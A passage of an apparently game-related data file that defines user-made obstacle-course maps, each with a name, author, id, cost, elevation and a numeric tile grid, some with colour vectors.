0,0,0,0,0,0,0,17,17,66,66,66,66,66,90,17,90,0,0,0,0,0,0,0,0,0,0,17,17,66,17,66,66,66,66,17,17,0,0,0,0,0,0,0,0,0,0,0,17,90,17,37,17,17,17,17,17,17,0,0,0,0,0,0,0,0,0,0,17,17,17,51,17,17,17,0,17,17,16,0,0,0,0,0,0,0,0,0,0,0,17,51,17,0,0,0,0,16,16,15,0,0,0,0,0,0,0,0,0,17,51,96,51,17,0,0,0,0,15,15,14,0,0,0,0,0,0,0,17,51,93,90,93,51,17,0,0,0,0,14,14,13,0,0,0,0,1,17,17,17,17,17,17,17,90,17,1,0,0,0,13,13,12,12,90,0,1,89,90,17,77,124,77,88,17,89,1,0,0,0,0,12,12,12,12,0,0,1,1,1,1,1,1,1,1,1,0,0,0,0,0,12,2,2,12]});
maps.push({name="Learn to jump",author="elektrik0",id="#1690999219",direction="forward",cost=128,elevation=19,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,1,1,27,27,1,1,0,0,5,5,0,0,0,0,0,0,0,0,0,0,1,27,27,27,27,1,1,1,6,6,0,0,0,0,0,0,0,0,0,0,1,96,27,27,27,0,27,27,107,107,1,1,1,0,0,0,0,0,0,0,1,5,1,27,0,0,0,27,7,7,0,0,1,1,0,0,0,0,0,0,1,3,1,1,0,43,0,0,0,0,0,28,0,1,1,0,0,0,0,0,44,24,24,1,0,0,0,36,0,35,0,0,0,0,1,0,0,0,0,0,0,0,44,24,44,0,42,0,0,0,0,0,29,0,1,0,0,0,0,0,44,0,0,24,0,0,0,37,0,0,34,0,0,0,1,0,0,0,0,0,44,0,0,1,0,41,0,0,0,0,0,0,30,0,1,0,0,0,0,0,44,0,0,1,0,0,0,38,0,33,0,0,0,0,1,0,0,0,0,0,0,0,0,1,0,40,0,0,0,0,0,0,31,0,1,0,0,0,0,0,0,44,0,1,1,0,0,39,0,0,32,0,0,1,1,0,0,0,0,0,44,44,0,0,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,44,44,0,44,0,0,44,0,0,0,0,0,44,0,44,93,0,0,0,97,44,0,0,44,44,0,0,0,0,44,0,0,0,0,44,94,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="pikagod",author="TheShy",id="#1691253028",direction="forward",cost=400,elevation=0,map=[93,93,93,93,93,93,93,93,93,93,93,93,93,93,93,93,93,93,2,2,93,Vector(10,15,25),Vector(12,15,24),Vector(16,17,25),Vector(24,23,27),Vector(32,30,33),Vector(25,24,27),Vector(20,19,22),Vector(41,41,42),Vector(65,65,65),Vector(105,104,104),Vector(94,93,93),Vector(104,104,103),Vector(57,57,57),Vector(25,26,28),Vector(17,12,16),Vector(22,5,10),Vector(98,71,75),Vector(129,93,96),Vector(126,86,88),93,Vector(9,14,24),Vector(12,15,23),Vector(17,17,24),Vector(26,24,28),Vector(29,26,29),Vector(30,28,30),Vector(80,78,79),Vector(189,188,187),Vector(213,212,210),Vector(207,204,203),Vector(200,197,195),Vector(161,158,153),Vector(127,124,118),Vector(98,96,91),Vector(52,44,41),Vector(37,20,20),Vector(78,49,51),Vector(129,89,90),Vector(144,97,98),93,Vector(13,14,19),Vector(20,18,21),Vector(47,42,44),Vector(70,64,65),Vector(76,70,71),Vector(137,133,132),Vector(227,224,223),Vector(228,226,222),Vector(212,210,205),Vector(187,183,179),Vector(180,175,170),Vector(149,143,135),Vector(146,141,131),Vector(141,136,125),Vector(116,107,99),Vector(90,72,68),Vector(88,58,57),Vector(141,97,97),Vector(147,95,97),93,Vector(98,90,87),Vector(126,114,108),Vector(132,119,111),Vector(133,121,115),Vector(159,150,145),Vector(210,204,199),Vector(224,221,215),Vector(225,223,217),Vector(203,201,194),Vector(189,184,178),Vector(170,164,156),Vector(149,142,131),Vector(149,142,130),Vector(147,142,128),Vector(139,130,117),Vector(122,105,95),Vector(89,60,54),Vector(133,87,87),Vector(144,89,92),93,Vector(155,144,139),Vector(154,138,129),Vector(155,138,127),Vector(176,163,154),Vector(196,186,179),Vector(167,159,154),Vector(194,189,184),Vector(220,217,210),Vector(218,215,207),Vector(195,188,181),Vector(158,149,141),Vector(137,127,117),Vector(138,127,115),Vector(147,138,123),Vector(153,141,126),Vector(137,121,107),Vector(110,83,74),Vector(116,71,68),Vector(150,97,98),93,Vector(169,161,158),Vector(173,160,153),Vector(178,165,156),Vector(199,188,180),Vector(162,153,147),Vector(79,69,67),Vector(123,115,113),Vector(219,213,208),Vector(198,191,184),Vector(163,153,147),Vector(119,106,100),Vector(62,46,40),Vector(81,64,56),Vector(106,89,77),Vector(151,135,120),Vector(153,137,122),Vector(115,91,79),Vector(94,54,48),Vector(137,89,86),93,Vector(80,73,72),Vector(170,161,156),Vector(200,190,183),Vector(207,198,190),Vector(145,136,130),Vector(55,44,42),Vector(146,133,132),Vector(206,191,187),Vector(174,159,153),Vector(119,104,98),Vector(46,30,25),Vector(34,13,10),Vector(42,20,15),Vector(93,72,61),Vector(140,121,106),Vector(152,136,120),Vector(127,105,91),Vector(87,51,42),Vector(117,75,69),93,Vector(31,27,28),Vector(66,61,58),Vector(199,193,186),Vector(206,199,190),Vector(180,172,162),Vector(178,166,160),Vector(187,169,164),Vector(119,91,86),Vector(135,106,100),Vector(91,69,63),Vector(37,18,12),Vector(39,16,14),Vector(51,27,24),Vector(84,61,51),Vector(132,112,97),Vector(149,133,117),Vector(135,116,101),Vector(101,71,60),Vector(111,75,66),93,Vector(27,25,28),Vector(56,53,52),Vector(204,200,195),Vector(204,198,189),Vector(190,182,171),Vector(207,195,187),Vector(194,175,168),Vector(99,70,63),Vector(176,144,138),Vector(154,128,121),Vector(117,91,86),Vector(62,32,32),Vector(70,39,37),Vector(84,57,48),Vector(141,119,105),Vector(158,141,124),Vector(136,117,101),Vector(100,72,59),Vector(105,74,63),93,Vector(31,29,33),Vector(38,35,35),Vector(198,194,190),Vector(202,196,187),Vector(193,186,175),Vector(194,184,174),Vector(201,188,179),Vector(179,162,154),Vector(187,164,157),Vector(166,137,130),Vector(120,84,79),Vector(86,43,45),Vector(91,49,50),Vector(83,51,44),Vector(152,127,114),Vector(160,141,125),Vector(140,120,103),Vector(106,79,66),Vector(99,68,56),93,Vector(32,30,34),Vector(34,31,32),Vector(181,177,174),Vector(207,201,193),Vector(188,181,170),Vector(170,160,150),Vector(139,128,119),Vector(160,148,141),Vector(198,181,174),Vector(154,125,117),Vector(97,59,53),Vector(88,43,42),Vector(86,43,42),Vector(103,72,63),Vector(158,135,121),Vector(159,140,124),Vector(145,126,110),Vector(118,93,80),Vector(95,67,55),93,Vector(32,31,35),Vector(41,39,42),Vector(149,145,144),Vector(209,203,196),Vector(200,192,182),Vector(142,130,122),Vector(52,39,32),Vector(79,68,64),Vector(201,187,182),Vector(168,144,134),Vector(105,74,63),Vector(97,60,52),Vector(108,72,64),Vector(150,125,111),Vector(155,136,120),Vector(155,139,122),Vector(148,132,115),Vector(126,106,91),Vector(96,74,61),93,Vector(38,37,42),Vector(42,40,44),Vector(115,112,112),Vector(209,204,198),Vector(208,200,191),Vector(157,145,137),Vector(66,54,47),Vector(77,67,64),Vector(195,183,178),Vector(184,166,155),Vector(163,139,126),Vector(152,123,111),Vector(158,130,117),Vector(156,136,119),Vector(154,138,120),Vector(154,140,123),Vector(150,135,121),Vector(132,117,105),Vector(100,83,73),93,Vector(41,40,46),Vector(43,42,47),Vector(78,75,76),Vector(188,183,178),Vector(203,196,187),Vector(198,188,179),Vector(142,131,122),Vector(128,118,111),Vector(199,188,180),Vector(183,171,158),Vector(173,158,143),Vector(162,143,128),Vector(162,142,126),Vector(160,143,125),Vector(156,140,123),Vector(153,138,124),Vector(147,134,124),Vector(90,79,74),Vector(33,24,20),93,Vector(44,43,51),Vector(57,56,61),Vector(63,59,59),Vector(170,162,156),Vector(197,186,176),Vector(194,181,170),Vector(195,182,171),Vector(192,179,170),Vector(199,188,178),Vector(181,171,159),Vector(173,162,148),Vector(169,156,140),Vector(167,152,136),Vector(167,152,136),Vector(162,147,133),Vector(156,143,132),Vector(117,107,100),Vector(42,35,34),Vector(23,18,20),93,Vector(67,65,76),Vector(66,63,67),Vector(98,91,89),Vector(190,176,167),Vector(183,165,152),Vector(186,167,152),Vector(180,161,147),Vector(191,175,162),Vector(199,187,174),Vector(187,177,165),Vector(175,166,153),Vector(170,158,144),Vector(166,154,140),Vector(163,151,138),Vector(166,155,144),Vector(145,136,129),Vector(61,55,51),Vector(25,22,23),Vector(17,15,18),93,Vector(83,80,90),Vector(80,75,78),Vector(169,158,153),Vector(185,166,153),Vector(169,146,128),Vector(173,149,131),Vector(159,136,119),Vector(155,136,121),Vector(169,155,143),Vector(195,185,175),Vector(184,177,167),Vector(177,168,158),Vector(174,164,155),Vector(161,152,145),Vector(106,98,93),Vector(55,50,46),Vector(31,28,27),Vector(17,16,19),Vector(15,14,19),93,Vector(83,79,86),Vector(117,109,107),Vector(183,169,159),Vector(181,160,141),Vector(177,151,128),Vector(176,147,125),Vector(156,129,110),Vector(145,124,111),Vector(158,144,134),Vector(165,157,151),Vector(174,169,164),Vector(148,143,139),Vector(103,98,95),Vector(66,62,61),Vector(36,32,33),Vector(28,25,26),Vector(23,22,24),Vector(19,20,24),Vector(14,15,20),93,93,93,93,93,93,93,93,93,93,93,93,93,93,93,93,93,93,2,2]});
maps.push({name="ZE ZOO",author="djinnz",id="#1691458363",direction="forward",cost=180,elevation=0,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,10,9,8,7,6,5,5,6,7,8,9,10,0,0,0,0,0,0,0,0,0,1,0,0,0,5,5,0,0,0,1,0,0,0,0,0,0,0,0,5,0,0,1,0,0,96,96,0,0,1,0,0,5,0,0,0,0,0,0,0,0,0,0,1,0,96,96,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,96,96,0,0,1,0,0,0,0,0,0,0,0,0,5,0,1,0,0,0,96,96,0,0,0,1,0,5,0,0,0,0,0,0,0,0,0,1,0,0,96,96,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,96,96,0,1,0,0,0,0,0,0,0,0,0,0,5,0,0,1,0,0,5,5,0,0,1,0,0,5,0,0,0,0,0,0,0,0,1,0,0,0,98,98,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,1,0,0,98,98,0,0,1,0,0,0,0,0,0,7,0,0,5,0,0,0,1,0,98,98,0,1,0,0,0,5,0,0,7,93,0,0,5,0,0,1,0,0,98,98,0,0,1,0,0,5,0,0,94,0,0,0,0,0,1,0,0,0,98,98,0,0,0,1,0,0,0,0,0,0,0,0,5,0,0,1,0,0,98,98,0,0,1,0,0,5,0,0,0,0,0,0,0,0,0,0,1,0,98,98,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,98,98,0,0,1,0,0,0,0,0,0,0,93,7,6,0,1,0,0,132,5,5,132,0,0,1,0,6,7,94,0,0,0,131,97,0,0,1,0,5,2,2,5,0,1,0,0,99,131,0,0]});
maps.push({name="Look Down",author="Headhunterz",id="#1691462495",direction="forward",cost=467,elevation=-2,map=[1,1,1,1,1,1,1,1,1,1,2,2,1,1,1,1,1,1,1,1,1,14,1,17,17,17,17,17,17,17,17,17,17,17,17,17,17,141,21,1,1,154,1,17,17,17,17,17,17,17,17,17,17,17,17,17,17,1,21,1,1,0,1,13,13,13,13,13,13,13,13,13,13,13,13,13,13,1,95,1,1,0,1,183,183,183,183,183,183,183,195,195,183,183,183,183,183,1,21,1,1,0,1,183,90,183,183,183,183,183,195,195,183,183,183,183,183,1,21,1,1,0,1,183,183,183,183,183,183,183,195,195,183,90,183,183,183,1,95,1,1,0,1,183,183,183,183,90,183,183,195,195,183,183,183,183,183,1,21,1,1,156,1,183,183,183,183,183,183,183,195,195,183,183,183,183,90,1,21,1,1,157,1,183,183,183,183,183,183,183,195,195,183,183,183,183,183,1,95,1,1,0,1,183,183,183,183,183,183,183,195,195,183,183,183,183,183,1,21,1,1,0,1,90,183,183,90,183,183,90,195,195,90,183,183,183,183,1,21,1,1,0,1,183,183,183,183,183,183,183,195,195,183,183,183,183,183,1,95,1,1,0,1,183,183,183,183,183,183,183,195,195,183,183,183,183,90,1,21,1,1,0,1,183,90,183,183,183,90,183,195,195,183,90,183,183,183,1,21,1,1,0,1,183,183,183,183,183,183,183,195,195,183,183,183,183,183,1,95,1,1,0,1,183,183,183,90,183,183,183,195,195,183,183,183,90,183,1,21,1,1,153,1,13,13,13,13,13,13,13,13,13,13,13,13,13,13,1,21,1,1,9,1,15,15,93,15,93,15,97,15,15,15,15,93,15,93,15,65,1,1,1,1,1,1,1,1,1,1,1,2,2,1,1,1,1,1,1,1,1]});
maps.push({name="Long Path",author="NyaaaDoge",id="#1691499941",direction="left",cost=198,elevation=-6,map=[0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,114,114,1,0,0,1,0,0,1,0,0,1,0,0,1,0,0,1,0,0,114,114,114,114,115,115,116,116,117,117,116,116,115,115,114,114,114,0,0,0,114,114,114,114,115,115,116,116,117,117,116,116,115,115,114,114,114,0,0,1,0,0,1,0,0,1,0,0,1,0,0,1,0,0,1,113,113,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,113,113,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,112,112,0,0,0,199,199,0,0,0,0,0,0,0,0,0,1,0,0,1,112,112,1,0,1,100,100,1,0,0,0,0,0,0,0,0,0,97,111,111,111,111,0,0,1,119,119,1,0,0,0,0,0,0,0,0,0,97,111,111,111,111,0,0,1,150,150,1,0,0,1,0,0,1,0,0,1,0,0,1,96,96,1,0,2,108,108,108,109,109,110,110,110,0,0,0,0,0,0,0,111,111,0,0,2,108,108,108,109,109,110,110,110,0,0,0,0,0,0,0,111,111,0,0,1,0,0,1,0,0,1,110,110,1,0,0,0,0,0,1,111,111,1,0,0,0,0,0,0,0,0,111,111,0,0,0,0,0,0,0,111,111,0,0,0,0,0,0,0,0,0,111,111,0,0,0,0,0,0,0,111,111,0,0,0,0,0,1,0,0,1,111,111,1,0,0,1,0,0,1,111,111,1,0,0,0,0,0,94,111,195,111,111,111,111,111,111,111,111,111,111,111,0,0,0,0,0,0,93,111,195,111,111,111,111,111,111,111,111,111,111,111,0,0,0,0,0,1,0,0,1,0,0,1,0,0,1,0,0,1,0,0,1,0]});
maps.push({name="Colorful Floors",author="NyaaaDoge",id="#1691499996",direction="forward",cost=252,elevation=0,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,114,114,114,114,114,114,0,0,0,0,0,0,0,0,0,0,0,0,0,114,114,114,114,114,114,114,114,0,0,0,0,0,0,0,0,0,0,0,1,195,1,1,146,146,1,Vector(179,179,250),Vector(179,179,250),1,0,0,0,0,0,0,0,1,1,1,Vector(190,50,255),146,0,1,146,146,1,Vector(179,179,250),Vector(179,179,250),Vector(179,179,250),1,0,0,0,0,0,1,Vector(190,50,255),146,146,Vector(190,50,255),0,1,1,Vector(255,113,115),Vector(255,113,115),1,Vector(179,179,250),1,Vector(179,179,250),Vector(179,179,250),1,0,0,0,1,97,Vector(190,50,255),Vector(190,50,255),1,1,1,100,1,146,146,1,Vector(179,179,250),Vector(179,179,250),1,Vector(179,179,250),Vector(179,179,250),1,0,0,1,Vector(190,50,255),Vector(190,50,255),Vector(190,50,255),146,146,Vector(190,50,255),Vector(190,50,255),1,146,146,1,Vector(179,179,250),Vector(179,179,250),1,Vector(179,179,250),94,1,0,0,0,1,1,1,1,1,96,1,1,Vector(255,113,115),Vector(255,113,115),1,Vector(179,179,250),Vector(179,179,250),1,Vector(179,179,250),Vector(179,179,250),1,0,0,0,0,0,0,1,Vector(190,50,255),Vector(190,50,255),Vector(190,50,255),1,146,146,1,Vector(179,179,250),1,Vector(179,179,250),Vector(179,179,250),1,0,0,0,0,0,0,1,Vector(190,50,255),Vector(190,50,255),Vector(190,50,255),100,1,146,146,1,Vector(179,179,250),Vector(179,179,250),Vector(179,179,250),1,0,0,0,0,0,0,1,Vector(190,50,255),146,1,1,1,1,Vector(255,113,115),Vector(255,113,115),1,Vector(179,179,250),Vector(179,179,250),1,0,0,0,0,0,0,1,Vector(190,50,255),Vector(190,50,255),1,93,88,93,1,146,146,1,142,142,1,0,0,0,0,0,0,1,100,146,1,Vector(190,50,255),Vector(190,50,255),Vector(190,50,255),1,146,146,1,Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),1,0,0,0,0,0,0,1,146,1,Vector(190,50,255),Vector(190,50,255),Vector(190,50,255),1,Vector(255,113,115),Vector(255,113,115),1,Vector(96,181,231),34,Vector(96,181,231),Vector(96,181,231),1,0,0,0,0,1,Vector(190,50,255),Vector(190,50,255),1,1,Vector(190,50,255),1,Vector(255,113,115),146,146,Vector(255,113,115),Vector(96,181,231),Vector(96,181,231),34,Vector(96,181,231),Vector(96,181,231),1,0,0,1,0,146,146,100,Vector(190,50,255),90,1,Vector(255,113,115),146,146,Vector(255,113,115),Vector(96,181,231),Vector(96,181,231),34,Vector(96,181,231),Vector(96,181,231),1,0,0,1,0,0,1,1,1,1,34,34,34,34,34,Vector(96,181,231),34,Vector(96,181,231),Vector(96,181,231),1,0,0,0,Vector(190,50,255),96,96,Vector(190,50,255),146,146,33,34,34,34,34,34,Vector(96,181,231),Vector(96,181,231),Vector(96,181,231),1,0,0,0,0,Vector(190,50,255),Vector(190,50,255),Vector(190,50,255),Vector(190,50,255),146,146,33,34,34,2,2,34,34,34,1,0,0,0,0,0]});
maps.push({name="NO BHOP",author="TheShy",id="#1691676713",direction="forward",cost=406,elevation=0,map=[17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,153,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,93,93,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,93,93,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,199,199,199,199,199,199,199,199,199,199,199,199,199,199,199,199,199,199,183,183,199,199,199,199,199,199,199,199,199,199,199,199,199,199,199,199,199,199,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,199,199,199,199,199,199,199,199,199,199,199,199,199,199,199,199,199,199,183,183,199,199,199,199,199,199,199,199,199,199,199,199,199,199,199,199,199,199,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,199,199,199,199,199,199,199,199,199,199,199,199,199,199,199,199,199,199,183,183,199,199,199,199,199,199,199,199,199,199,199,199,199,199,199,199,199,199,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,157,93,93,154,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,93,93,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2]});
maps.push({name="zib1 ni gan ma",author="TheShy",id="#1691678580",direction="forward",cost=516,elevation=0,map=[14,14,14,199,14,14,14,14,14,14,14,14,14,14,1,1,1,14,2,2,14,14,199,14,14,14,14,14,14,14,14,14,14,14,1,14,1,14,14,14,14,199,199,199,199,199,199,199,199,199,14,14,14,14,1,1,1,14,14,14,199,14,14,14,14,14,199,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,199,14,14,199,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,199,14,14,14,14,14,14,199,14,14,14,14,199,199,199,199,199,199,199,199,199,199,199,199,199,199,199,199,199,14,14,14,199,14,199,14,199,199,199,14,199,14,14,14,14,14,85,14,14,85,14,14,199,14,199,199,131,14,93,14,199,199,14,14,199,14,85,14,85,85,14,14,199,199,199,199,199,199,199,14,199,14,14,14,14,199,85,85,14,85,14,14,199,14,199,199,131,14,93,14,14,14,14,14,14,14,85,14,14,85,199,14,199,14,199,14,1,1,1,14,14,14,199,14,14,14,14,14,14,14,14,199,199,14,14,14,131,14,93,14,14,14,199,14,14,14,85,14,85,85,14,14,199,14,199,14,1,1,1,199,14,14,199,14,14,14,14,14,14,14,14,14,199,14,199,199,131,14,93,199,14,14,199,14,14,14,14,14,85,85,85,85,199,199,199,199,199,199,199,199,199,199,199,199,199,199,199,199,199,85,14,85,199,14,199,199,131,14,93,199,14,132,199,14,14,14,14,14,14,85,85,85,199,14,199,14,1,1,1,199,14,14,199,14,14,14,14,14,14,14,14,14,199,14,14,14,131,14,93,14,14,14,199,14,14,14,14,14,85,85,85,85,14,14,14,14,14,14,14,2,2,14,199,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14]});
maps.push({name="BuHuiNaShenQiDeBieNa",author="TheShy",id="#1691681469",direction="forward",cost=88,elevation=0,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,34,34,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,34,34,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,34,34,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,34,34,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,34,34,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,34,34,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,34,34,0,0,0,0,0,0,0,0,0,93,0,0,93,0,0,0,93,0,34,34,0,93,0,0,0,93,0,0,93,34,168,0,29,168,0,168,39,0,34,34,0,39,168,0,168,29,0,168,34,34,174,0,29,173,0,175,39,0,34,34,0,39,176,0,178,29,0,177,34,93,0,0,93,0,0,0,93,0,34,34,0,93,0,0,0,93,0,0,93,0,0,0,0,0,0,0,0,0,34,34,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,34,34,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,34,34,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,34,34,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,34,34,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,34,34,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,34,34,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0]});
maps.push({name="USER 33332",author="TheShy",id="#1691683178",direction="forward",cost=314,elevation=0,map=[5,154,199,0,0,0,0,183,183,2,2,183,0,183,0,183,0,199,94,14,153,157,199,183,183,183,183,0,183,183,183,183,0,183,0,183,0,199,94,94,199,199,199,183,183,183,183,0,183,183,183,183,0,0,0,0,0,199,199,199,183,183,183,0,0,0,0,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,0,183,0,183,0,183,183,183,183,183,183,0,0,0,183,0,183,183,183,183,0,183,0,183,0,183,183,183,183,183,183,0,183,0,183,0,183,183,183,183,0,0,0,0,0,183,183,183,183,183,183,0,183,0,183,0,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,0,183,0,0,0,183,183,183,183,0,183,0,183,0,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,0,183,0,183,0,183,183,183,183,183,183,0,0,0,0,0,183,183,183,183,0,0,0,0,0,183,183,183,183,183,183,0,183,0,183,0,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,0,183,0,183,0,183,183,183,183,0,183,0,183,0,183,183,183,183,183,183,0,183,0,183,0,183,183,183,183,0,183,0,183,0,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,0,0,0,0,0,183,183,183,183,183,183,0,0,0,0,0,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,0,183,0,183,183,183,183,183,183,0,183,0,0,0,183,183,183,199,199,199,0,183,0,0,183,183,183,183,183,0,183,0,183,0,199,199,199,93,93,199,0,0,0,183,0,183,183,183,183,0,0,0,183,0,199,93,93,14,93,199,183,183,183,183,183,183,2,2,183,183,183,183,183,183,199,93,14]});
maps.push({name="cotton de lover",author="TheShy",id="#1691767920",direction="forward",cost=153,elevation=0,map=[0,0,0,0,0,0,0,0,7,2,2,7,7,0,0,0,0,0,0,0,0,0,0,0,0,7,7,0,7,9,9,7,0,7,0,0,0,0,0,0,0,0,0,0,0,7,7,0,7,9,9,7,0,0,7,0,0,0,0,0,0,0,0,0,0,0,7,0,7,9,9,7,0,5,0,7,0,0,0,0,0,0,0,0,0,0,7,0,7,9,9,7,5,153,5,7,0,0,0,0,0,0,0,0,0,0,7,0,7,9,9,7,0,5,0,7,0,0,0,0,0,0,0,0,0,0,7,0,7,9,9,7,0,0,0,7,0,0,0,0,0,0,0,0,0,0,7,0,7,9,9,7,0,5,0,7,0,0,0,0,0,0,0,0,0,0,7,0,7,9,9,7,5,154,5,7,0,0,0,0,0,0,0,0,0,0,7,0,7,9,9,7,0,5,0,7,0,0,0,0,0,0,0,0,0,0,7,0,7,9,9,7,0,5,0,7,0,0,0,0,0,0,0,0,0,0,7,0,7,9,9,7,5,100,5,7,0,0,0,0,0,0,0,0,0,0,7,0,7,9,9,7,0,5,0,7,0,0,0,0,0,0,0,0,0,7,7,7,7,9,9,7,0,0,0,7,0,0,0,0,93,93,93,93,93,7,88,88,7,9,9,7,0,5,0,7,0,0,0,0,0,93,93,0,0,7,7,7,7,9,9,7,5,157,5,7,0,0,0,0,0,0,93,0,0,0,0,0,7,9,9,7,0,5,0,7,0,0,0,0,0,0,0,0,0,0,0,0,7,9,9,7,0,0,7,0,0,0,0,0,0,0,0,0,0,0,0,0,7,9,9,7,0,7,0,0,0,0,0,0,0,0,0,0,0,0,0,0,7,2,2,7,7,0,0,0,0,0,0,0]});
maps.push({name="Ppsmoking return",author="xDarkCein",id="#1691792689",direction="forward",cost=288,elevation=0,map=[0,0,0,0,0,0,0,5,2,2,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,94,94,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,142,142,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,93,5,0,0,0,0,0,0,0,0,0,0,104,95,5,95,5,95,5,95,5,5,0,0,0,0,0,0,0,0,0,0,5,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,93,0,0,0,0,0,0,199,70,70,199,199,199,0,0,0,0,0,0,0,0,0,0,0,0,0,199,103,103,103,103,67,67,199,0,0,0,0,0,0,0,0,0,0,0,199,103,103,103,103,106,103,67,199,0,0,0,0,0,0,0,0,0,0,0,199,103,103,131,103,106,103,67,199,0,0,0,0,0,0,0,0,0,0,0,0,199,103,1,103,106,103,67,199,0,0,0,0,0,0,0,0,199,199,199,0,199,103,103,103,106,103,67,199,0,0,0,0,0,0,1,1,5,82,82,199,103,103,133,103,106,103,67,199,0,0,0,0,0,0,132,5,5,82,82,199,103,103,1,103,54,199,199,0,0,0,0,0,0,0,1,1,5,82,82,5,199,199,199,199,23,199,0,0,0,0,0,0,0,0,134,94,5,82,82,5,95,5,5,199,23,199,0,0,0,0,0,0,0,0,1,1,5,82,82,5,95,2,2,199,12,199,0,0,0,0,0,0,0,0]});
maps.push({name="Las Condes",author="Dogeeri",id="#1691797348",direction="left",cost=515,elevation=13,map=[189,100,13,186,0,0,0,0,0,0,1,131,18,1,1,1,1,10,2,2,13,175,0,0,0,0,0,187,11,97,95,1,93,18,18,18,184,10,10,10,0,0,0,0,0,0,0,0,1,1,10,66,1,96,96,10,184,10,10,10,0,0,0,0,0,0,10,10,96,10,10,71,10,10,1,10,184,10,10,127,0,0,187,10,174,66,10,75,199,10,10,71,10,10,143,10,184,10,10,96,187,17,0,0,66,66,10,75,96,10,10,71,10,10,143,10,184,10,10,10,168,173,0,0,10,10,10,75,199,10,10,71,10,10,143,10,184,10,10,10,17,66,17,148,10,10,10,10,96,10,10,71,10,10,1,10,184,10,93,10,16,16,17,17,75,17,17,17,1,1,1,1,1,1,18,18,18,10,10,10,16,16,16,16,75,17,17,17,17,90,17,17,17,17,17,17,1,96,96,96,90,16,16,16,75,17,17,17,17,17,17,17,17,17,99,18,1,10,10,96,1,16,90,16,75,17,90,16,16,16,16,17,90,17,18,19,1,76,10,10,0,199,1,1,1,1,1,98,98,98,98,199,199,20,20,20,199,76,76,76,148,15,132,0,94,0,1,16,16,16,16,93,199,0,0,0,0,76,76,76,122,122,122,186,122,0,1,3,16,16,75,95,98,16,16,16,188,76,76,76,90,122,122,122,122,0,199,20,3,16,75,95,98,16,85,16,10,76,76,76,123,123,122,122,122,122,122,121,20,3,75,1,98,16,16,16,188,76,76,76,2,123,123,122,122,122,122,100,121,20,1,1,98,16,16,17,10,75,75,75,2,123,123,123,122,122,122,122,0,0,0,1,98,15,16,17,3,10,94,75,123,123,90,123,90,122,122,0,0,0,0,0,0,127,15,17,17,75,75,75]});
